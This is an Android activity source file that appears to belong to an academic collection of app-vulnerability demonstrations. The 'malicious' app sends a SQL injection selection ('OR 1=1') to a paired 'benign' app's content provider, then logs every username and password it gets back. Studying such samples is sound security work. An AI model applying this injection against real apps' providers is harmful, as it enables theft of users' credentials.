package edu.ksu.cs.malicious;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "Malicious";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume() {
        super.onResume();
        TextView res = (TextView) findViewById(R.id.result);
        String[] projection = {"username", "password"};
        String selection = "username" + " = \"\" AND " + "password" + " = \"pass\" OR 1=1";
        Uri.Builder uriBuilder = new Uri.Builder();
        uriBuilder.authority("edu.ksu.cs.benign.AUTH_CP");
        uriBuilder.scheme("content");
        Cursor cursor = getContentResolver().query(uriBuilder.build(), projection, selection, null, null);
        if (cursor != null) {
            Log.d(TAG, "cursor count = " + cursor.getCount());
            res.setText(R.string.Benign);
            while (cursor.moveToNext()) {
                String username = cursor.getString(cursor.getColumnIndex("username"));
                String password = cursor.getString(cursor.getColumnIndex("password"));
                Log.d(TAG, "username = " + username);
                Log.d(TAG, "password = " + password);
            }
            cursor.close();
        } else {
            Log.d(TAG, "cursor is null");
            res.setText(R.string.Secure);
        }
    }
}
